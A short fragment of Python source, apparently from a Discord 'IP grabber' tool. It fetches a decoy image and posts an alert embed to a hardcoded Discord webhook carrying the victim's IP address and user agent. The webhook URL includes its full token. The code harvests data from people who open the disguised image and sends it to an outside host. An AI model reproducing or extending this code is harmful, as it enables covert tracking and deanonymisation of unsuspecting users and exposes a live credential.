...
webhook = 'https://discord.com/api/webhooks/1419145126739050638/XfkDbuJjAjGxzgGFTXpterNOM6jkS5RILOKwHyyxtFFie4A17DD2IUEP7mVPQP43OifG'

bindata = httpx.get('https://user-images.githubusercontent.com/106576578/182258121-eb912994-31aa-4385-9d7f-dc81a4b55f55.png').content
  ...
  "embeds": [
    {
      "title": "Alert!",
      "color": 16711803,
      "description": f"Discord previewed a IP Grabber Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
